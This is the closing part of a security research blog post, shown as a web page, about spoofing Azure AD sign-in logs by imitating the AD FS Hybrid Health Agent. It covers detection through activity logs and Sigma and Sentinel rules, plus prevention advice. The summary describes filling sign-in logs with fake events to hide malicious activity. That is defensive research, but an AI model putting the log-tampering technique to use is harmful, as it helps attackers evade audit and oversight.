+</span><span class="hl">/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts2.company.com Creates a server.  admin@company.com 2021-08-25T15:10:58.3348792Z 51.65.246.212
+</span><span class="hl">/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts2.company.com Creates a server.  admin@company.com 2021-08-25T15:10:16.2093169Z 51.65.246.212
+</span><span class="hl">/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts2.company.com Creates a server.  admin@company.com 2021-08-25T15:10:15.5693784Z 51.65.246.212
+</span><span class="hl">/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts2.company.com Creates a server.  admin@company.com 2021-08-25T15:07:11.3219081Z 51.65.246.212
+</span><span class="hl">/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts2.company.com Creates a server.  admin@company.com 2021-08-25T15:07:10.5819036Z 51.65.246.212
+</span><span class="hl">/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts2.company.com Creates a server.  admin@company.com 2021-08-25T15:04:18.1500781Z 51.65.246.212
+</span><span class="hl">/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts2.company.com Creates a server.  admin@company.com 2021-08-25T15:04:17.7750301Z 51.65.246.212
+</span><span class="hl">/providers/Microsoft.ADHybridHealthService                                               Updates a service. admin@company.com 2021-08-25T15:02:33.2797177Z 51.65.246.212
+</span><span class="hl">/providers/Microsoft.ADHybridHealthService                                               Updates a service. admin@company.com 2021-08-25T15:02:33.0297112Z 51.65.246.212
+</span>/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts.company.com  Deletes service.   admin@company.com 2021-08-25T15:01:26.9612649Z 152.219.25.6
+/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts.company.com  Deletes service.   admin@company.com 2021-08-25T15:01:26.7262514Z 152.219.25.6
+/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts.company.com  Deletes service.   admin@company.com 2021-08-25T15:01:18.4399245Z 152.219.25.6
+/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts.company.com  Deletes service.   admin@company.com 2021-08-25T15:01:18.2599207Z 152.219.25.6
+/providers/Microsoft.ADHybridHealthService                                               Updates a service. admin@company.com 2021-08-25T15:00:00.5760736Z 152.219.25.6
+/providers/Microsoft.ADHybridHealthService                                               Updates a service. admin@company.com 2021-08-25T14:59:53.6402357Z 152.219.25.6</code></pre></div></p>
+
+<p>The highlighted rows shows that modification requests are originating from a different ip address and thus indicates suspicious activity.</p>
+
+<p>For automated detection, see <a href="https://twitter.com/Cyb3rWard0g" target="_blank">@Cyb3rWard0g</a>&rsquo;s <a href="https://github.com/SigmaHQ/sigma/pull/1934" target="_blank">Sigma</a>
+and <a href="https://github.com/search?q=repo%3AAzure%2FAzure-Sentinel+extension%3Ayaml+filename%3AAADHybridHealthADFSNewServer.yaml+filename%3AAADHybridHealthADFSServiceDelete.yaml+filename%3AAADHybridHealthADFSSuspApp.yaml+filename%3AAADHealthMonAgentRegKeyAccess.yaml+filename%3AAADHealthSvcAgentRegKeyAccess.yaml&type=Code&ref=advsearch&l=&l=" target="_blank">Azure Sentinel</a> rules!</p>
+
+<h1 id="how-to-prevent">How to prevent</h1>
+
+<p>There are no special actions to take to prevent the exploitation. However, the two actions mentioned many many times earlier are still working:</p>
+
+<ul>
+<li>Treat AD FS servers as Tier 0 servers</li>
+<li>Limit the number of Global Administrators</li>
+</ul>
+
+<h1 id="summary">Summary</h1>
+
+<p>Azure AD Hybrid Health agents are used to provide health status of hybrid on-prem services to Azure Portal. Since March 2021, also AD FS log-in events are sent to Azure AD and are available at Azure AD sign-ins log.</p>
+
+<p>As I demonstrated in this blog, these kind of services can easily be exploited and used for sending arbitrary information to the target tenant.
+In this case, one can fill the Azure AD sign-ins log with fake log-in events to hide malicious activity. I also demonstrated how it was possible to tamper with the existing sign-in events before it was fixed by Microsoft.</p>
+
+<h1 id="references">References</h1>
+
+<ul>
+<li>Secureworks: <a href="https://www.secureworks.com/research/azure-active-directory-sign-ins-log-tampering" target="_blank">Azure Active Directory Sign-Ins Log Tampering</a></li>
+<li>Microsoft: <a href="https://docs.microsoft.com/en-us/azure/active-directory/hybrid/whatis-azure-ad-connect#what-is-azure-ad-connect-health" target="_blank">What is Azure AD Connect Health?</a></li>
+<li>Microsoft: <a href="https://techcommunity.microsoft.com/t5/azure-active-directory-identity/march-identity-updates-public-preview-of-ad-fs-sign-in-activity/ba-p/1994705" target="_blank">March identity updates – Public preview of AD FS sign-in activity in Azure AD reporting and more</a></li>
+<li>Microsoft: <a href="https://docs.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-health-ad-fs-sign-in" target="_blank">AD FS sign-ins in Azure AD with Connect Health - preview</a></li>
+<li>Roberto Rodriguez (@Cyb3rWard0g): <a href="https://github.com/SigmaHQ/sigma/pull/1934" target="_blank">SigmaHQ pull request #1934: Feature/aad health agent hybrid adfs services</a></li>
+<li>Roberto Rodriguez (@Cyb3rWard0g): <a href="https://github.com/search?q=repo%3AAzure%2FAzure-Sentinel+extension%3Ayaml+filename%3AAADHybridHealthADFSNewServer.yaml+filename%3AAADHybridHealthADFSServiceDelete.yaml+filename%3AAADHybridHealthADFSSuspApp.yaml+filename%3AAADHealthMonAgentRegKeyAccess.yaml+filename%3AAADHealthSvcAgentRegKeyAccess.yaml&type=Code&ref=advsearch&l=&l=" target="_blank">Azure Sentinel AAD Hybrid Health rules</a></li>
+</ul>
+		</div>
+		
+<div class="post__tags tags clearfix">
+	<img class="icon icon-tag" src="/images/tags.png" width="16" height="16" viewBox="0 0 16 16">
+	
+	<ul class="tags__list">
+		<li class="tags__item"><a class="tags__link" href="/tags/azure-active-directory/" rel="tag">Azure Active Directory</a></li>
+		<li class="tags__item"><a class="tags__link" href="/tags/azure/" rel="tag">Azure</a></li>
+		<li class="tags__item"><a class="tags__link" href="/tags/adfs/" rel="tag">ADFS</a></li>
+		<li class="tags__item"><a class="tags__link" href="/tags/on-prem/" rel="tag">on-prem</a></li>
+		<li class="tags__item"><a class="tags__link" href="/tags/aadconnect/" rel="tag">AADConnect</a></li>
+		<li class="tags__item"><a class="tags__link" href="/tags/azuread/" rel="tag">AzureAD</a></li>
+	</ul>
+</div>
+
+		<div class="post__tags tags clearfix">
+<ul class="tags__list">
+	<li class="tags__item"><a class="tags__link" href="http://twitter.com/intent/tweet?url=http%3a%2f%2fo365blog.com%2fpost%2fhybridhealthagent%2f&text=Spoofing%20Azure%20AD%20sign-ins%20logs%20by%20imitating%20AD%20FS%20Hybrid%20Health%20Agent&tw_p=tweetbutton" title="Share in Twitter" target="_blank" rel="nofollow"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
+	<li class="tags__item"><a class="tags__link" href="https://www.linkedin.com/shareArticle?url=http%3a%2f%2fo365blog.com%2fpost%2fhybridhealthagent%2f&mini=true&title=Spoofing%20Azure%20AD%20sign-ins%20logs%20by%20imitating%20AD%20FS%20Hybrid%20Health%20Agent&summary=&source=o365blog.com" title="Share in LinkedIn" target="_blank" rel="nofollow"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
+</ul>
+</div>
+	</article>
+	
+<div class="authorbox clearfix">
+	<figure class="authorbox__avatar">
+		<img alt="Dr Nestori Syynimaa (@DrAzureAD) avatar" src="/images/nestori.jpg" class="avatar" height="90" width="90">
+	</figure>
+	<div class="authorbox__header">
+		<span class="authorbox__name">About Dr Nestori Syynimaa (@DrAzureAD)</span>
+	</div>
+	<div class="authorbox__description">
+		Dr Syynimaa works as Senior Principal Information Security Researcher at Secureworks CTU (Counter Threat Unit). <br> Before moving to his current position, Dr Syynimaa worked as a CIO, consultant, trainer, and university lecturer for over 20 years. He is a regular speaker in scientific and professional conferences related to Microsoft 365 and Azure AD security. <br><br>Dr Syynimaa is Microsoft Certified Expert (Microsoft 365), Microsoft Certified Azure Solutions Architect Expert, Microsoft Certified Trainer, Microsoft MVP (Enterprise Mobility, Identity and Access &amp; Intune), and Microsoft Most Valuable Security Researcher (MVR).
+	</div>
+</div>
+	
+<nav class="post-nav row clearfix" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement">
+	<div class="post-nav__item post-nav__item--prev col-1-2">
+		<a class="post-nav__link" href="/post/adfs/" rel="prev"><span class="post-nav__caption">«Previous</span><p class="post-nav__post-title">Exporting AD FS certificates revisited: Tactics, Techniques and Procedures</p></a>
+	</div>
+	<div class="post-nav__item post-nav__item--next col-1-2">
+		<a class="post-nav__link" href="/post/admintools/" rel="next"><span class="post-nav__caption">Next»</span><p class="post-nav__post-title">AADInternals admin and blue team tools</p></a>
+	</div>
+</nav>
+
+	
+<div class="comments">
+	<div id="disqus_thread"></div>
+<script>
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "o365blog-com" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+</main>
+
+<aside class="sidebar" itemscope="itemscope" itemtype="http://schema.org/WPSideBar">
+	
+<div class="widget-search widget">
+	<form class="widget-search__form" role="search" method="get" action="//google.com/search">
+		<label>
+			<span class="screen-reader-text">Search for:</span>
+			<input class="widget-search__field" type="search" placeholder="SEARCH..." value="" name="q">
+		</label>
+		<input class="widget-search__submit" type="submit" value="Search">
+		<input type="hidden" name="sitesearch" value="http://o365blog.com" />
+	</form>
+</div>
+	
+<div class="widget-recent widget">
+	<h4 class="widget__title">Recent Posts</h4>
+	<div class="widget__content">
+		<ul class="widget__list">
+			<li class="widget__item"><a class="widget__link" href="/post/pta/">Exploiting Azure AD PTA vulnerabilities: Creating backdoor and harvesting credentials</a></li>
+			<li class="widget__item"><a class="widget__link" href="/post/gmsa/">Hunt for the gMSA secrets</a></li>
+			<li class="widget__item"><a class="widget__link" href="/post/august_2022/">AADInternals World Tour August 2022: USA</a></li>
+			<li class="widget__item"><a class="widget__link" href="/post/deviceidentity/">Stealing and faking Azure AD device identities</a></li>
+			<li class="widget__item"><a class="widget__link" href="/post/partners/">Microsoft partners: The Good, The Bad, or The Ugly?</a></li>
+		</ul>
+	</div>
+</div>
+
+	
+<div class="widget-categories widget">
+	<h4 class="widget__title">Categories</h4>
+	<div class="widget__content">
+		<ul class="widget__list">
+			<li class="widget__item"><a class="widget__link" href="/categories/"></a></li>
+			<li class="widget__item"><a class="widget__link" href="/categories/article">Article</a></li>
+			<li class="widget__item"><a class="widget__link" href="/categories/blog">Blog</a></li>
+		</ul>
+	</div>
+</div>
+	
+<div class="widget-social widget">
+	<h4 class="widget-social__title widget__title">Social</h4>
+	<div class="widget-social__content widget__content">
+		<div class="widget-social__item widget__item">
+			<a class="widget-social__link widget__link btn" title="Twitter" rel="noopener noreferrer" href="https://twitter.com/DrAzureAD" target="_blank">
+				<svg class="widget-social__link-icon icon-twitter" viewBox="0 0 384 312" width="24" height="24" xmlns="http://www.w3.org/2000/svg" fill="#fff"><path d="m384 36.9c-14.1 6.3-29.3 10.5-45.2 12.4 16.3-9.7 28.8-25.2 34.6-43.6-15.2 9-32.1 15.6-50 19.1-14.4-15.2-34.9-24.8-57.5-24.8-43.5 0-78.8 35.3-78.8 78.8 0 6.2.7 12.2 2 17.9-65.5-3.3-123.5-34.6-162.4-82.3-6.7 11.6-10.6 25.2-10.6 39.6 0 27.3 13.9 51.4 35 65.6-12.9-.4-25.1-4-35.7-9.9v1c0 38.2 27.2 70 63.2 77.2-6.6 1.8-13.6 2.8-20.8 2.8-5.1 0-10-.5-14.8-1.4 10 31.3 39.1 54.1 73.6 54.7-27 21.1-60.9 33.7-97.8 33.7-6.4 0-12.6-.4-18.8-1.1 34.9 22.4 76.3 35.4 120.8 35.4 144.9 0 224.1-120 224.1-224.1 0-3.4-.1-6.8-.2-10.2 15.4-11.1 28.7-25 39.3-40.8z"/></svg>
+				<span>Twitter</span>
+			</a>
+		</div>
+		<div class="widget-social__item widget__item">
+			<a class="widget-social__link widget__link btn" title="" rel="noopener noreferrer" href="https://linkedin.com/in/nestori" target="_blank">
+				<svg class="widget-social__link-icon icon-linkedin" viewBox="0 0 352 352" width="24" height="24" fill="#fff" xmlns="http://www.w3.org/2000/svg"><path d="M0,40v272c0,21.9,18.1,40,40,40h272c21.9,0,40-18.1,40-40V40c0-21.9-18.1-40-40-40H40C18.1,0,0,18.1,0,40z M312,32 c4.6,0,8,3.4,8,8v272c0,4.6-3.4,8-8,8H40c-4.6,0-8-3.4-8-8V40c0-4.6,3.4-8,8-8H312z M59.5,87c0,15.2,12.3,27.5,27.5,27.5 c15.2,0,27.5-12.3,27.5-27.5c0-15.2-12.3-27.5-27.5-27.5C71.8,59.5,59.5,71.8,59.5,87z M187,157h-1v-21h-45v152h47v-75 c0-19.8,3.9-39,28.5-39c24.2,0,24.5,22.4,24.5,40v74h47v-83.5c0-40.9-8.7-72-56.5-72C208.5,132.5,193.3,145.1,187,157z M64,288h47.5 V136H64V288z"/></svg>
+				<span>LinkedIn</span>
+			</a>
+		</div>
+		<div class="widget-social__item widget__item">
+			<a class="widget-social__link widget__link btn" title="Email" href="mailto:nestori.syynimaa@gerenios.com">
+				<svg class="widget-social__link-icon icon-mail" viewBox="0 0 416 288" width="24" height="24" xmlns="http://www.w3.org/2000/svg" fill="#fff"><path d="m0 16v256 16h16 384 16v-16-256-16h-16-384-16zm347 16-139 92.5-139-92.5zm-148 125.5 9 5.5 9-5.5 167-111.5v210h-352v-210z"/></svg>
+				<span>nestori.syynimaa@gerenios.com</span>
+			</a>
+		</div>
+	</div>
+</div>
+
+	
+<div class="widget-taglist widget">
+	<h4 class="widget__title">Tags</h4>
+	<div class="widget__content">
+		<a class="widget__link widget__link--taglist" href="/tags/aadconnect" title="aadconnect">aadconnect (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/aadinternals" title="aadinternals">aadinternals (10)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/abusing" title="abusing">abusing (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/active-directory" title="active-directory">active-directory (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/adfs" title="adfs">adfs (5)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/admin" title="admin">admin (3)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/administration" title="administration">administration (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/authentication" title="authentication">authentication (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/azure" title="azure">azure (20)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/azure-active-directory" title="azure-active-directory">azure-active-directory (27)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/azuread" title="azuread">azuread (4)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/backdoor" title="backdoor">backdoor (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/blackhat" title="blackhat">blackhat (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/blue-team" title="blue-team">blue-team (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/bprt" title="bprt">bprt (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/browser" title="browser">browser (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/compromise" title="compromise">compromise (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/conferences" title="conferences">conferences (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/defcon" title="defcon">defcon (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/desktop-sso" title="desktop-sso">desktop-sso (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/device" title="device">device (3)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/dns" title="dns">dns (3)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/email" title="email">email (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/encryption" title="encryption">encryption (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/exchange" title="exchange">exchange (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/federation" title="federation">federation (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/forensics" title="forensics">forensics (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/gdpr" title="gdpr">gdpr (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/global-administrator" title="global-administrator">global-administrator (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/graph" title="graph">graph (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/groups" title="groups">groups (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/guest" title="guest">guest (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/hybrid-join" title="hybrid-join">hybrid-join (3)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/identity" title="identity">identity (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/inactive" title="inactive">inactive (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/insider" title="insider">insider (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/intune" title="intune">intune (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/join" title="join">join (3)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/logs" title="logs">logs (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/mailbox" title="mailbox">mailbox (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/mdm" title="mdm">mdm (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/mfa" title="mfa">mfa (6)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/office-365" title="office-365">office-365 (9)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/office365" title="office365">office365 (9)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/on-prem" title="on-prem">on-prem (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/onedrive" title="onedrive">onedrive (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/outsider" title="outsider">outsider (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/partner" title="partner">partner (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/password" title="password">password (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/persistence" title="persistence">persistence (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/phishing" title="phishing">phishing (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/planner" title="planner">planner (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/powershell" title="powershell">powershell (13)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/prt" title="prt">prt (6)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/pta" title="pta">pta (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/recon" title="recon">recon (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/reconnaissance" title="reconnaissance">reconnaissance (4)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/seamless-sso" title="seamless-sso">seamless-sso (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/security" title="security">security (31)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/sso" title="sso">sso (2)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/sync" title="sync">sync (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/synchronisation" title="synchronisation">synchronisation (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/t2" title="t2">t2 (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/talks" title="talks">talks (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/teams" title="teams">teams (3)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/user" title="user">user (1)</a>
+		<a class="widget__link widget__link--taglist" href="/tags/virtual-machine" title="virtual-machine">virtual-machine (1)</a>
+	</div>
+</div>
+</aside>
+
+	</div>
+		<footer class="footer" itemscope="itemscope" itemtype="http://schema.org/WPFooter">
+			<div class="container container-inner">
+				<p class="footer__copyright"><span><a href="https://creativecommons.org/licenses/by/4.0/" target="_blank"><img src="/images/CC-BY.png"></a> </span></p>
+			</div>
+		</footer>
+	</div>
+
+<script>
+	var navigation = responsiveNav(".menu", {
+		navClass: "menu--collapse",
+	});
+</script>
+</body>
+</html>
